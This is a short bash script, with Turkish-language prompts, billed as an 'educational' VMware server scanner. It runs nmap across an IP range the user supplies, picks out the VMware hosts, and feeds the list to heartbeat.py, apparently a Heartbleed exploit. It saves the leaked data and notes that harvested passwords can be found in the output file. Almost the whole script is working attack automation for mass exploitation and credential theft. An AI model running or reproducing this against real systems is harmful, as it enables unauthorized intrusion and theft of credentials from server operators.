#!/bin/bash
##############################################
#
# VMware Server Scanner by Serhatgksu
# Just made this for educational usage
# This script tested at Kali and Parrot
# For questions, comments or request :
# Telegram @serhatgksu
# 
##############################################


function print() {
    text="$1"
    color="$2"
    if [ "$color" == "gray" ]; then
        header="\e[38;5;250m"
    elif [ "$color" == "red" ]; then
        header="\e[91m"
    elif [ "$color" == "green" ]; then
        header="\e[92m"
    elif [ "$color" == "yellow" ]; then
        header="\e[93m"
    fi
    tail="\e[0m"
    echo -en $header$text$tail
}

if [ $UID -ne 0 ]; then
    echo -e "\\e[91mProgramı root haklarıyla çalıştırmalısınız!\033[m" 
    sleep 3
 	exit
    fi

print "Taramak istediğiniz ip yada ip aralığını giriniz. Örn: 1.2.3.4 - 1.2.3.0/24\n" "red" 
print "IP = " "red" 
read IP_RANGE
echo -e "
\033[31m#######################################################\033[m
                 VMWARE SUNUCULAR TARANIYOR
\033[31m#######################################################\033[m"
nmap -sV -p 80,443 $IP_RANGE -oA output

print "VMware Sunucu IP'leri hangi isimle kayıt edilsin?\n" "red" 
print "Dosya adı = " "red" 
read VMwareServers

print "Exploit edilebilir IP'lerden çıkacak olan data hangi isimle kayıt edilsin. (Düşen şifreler bu dosyadan bulunabilir.)\n" "red" 
print "Dosya adı = " "red" 
read VulnData

cat output.gnmap | grep open | grep VMware | cut -d: -f2 | awk '{ print $1}' > $VMwareServers

echo -e "
\033[31m#######################################################\033[m
   TARAMA TAMAMLANDI. IP'LERİN YER ALDIĞI DOSYA 
 VMwareServers ADI İLE BULUNDUĞUNUZ KLASORE KAYIT EDİLDİ.
\033[31m#######################################################\033[m"

python heartbeat.py $ip -p 443 -f $VMwareServers -n 50 > $VulnData.txt 


echo -e "
\033[31m#######################################################\033[m
          İŞLEM TAMAMLANDI ÇIKIŞ YAPILIYOR...
\033[31m#######################################################\033[m"

sleep 120
exit



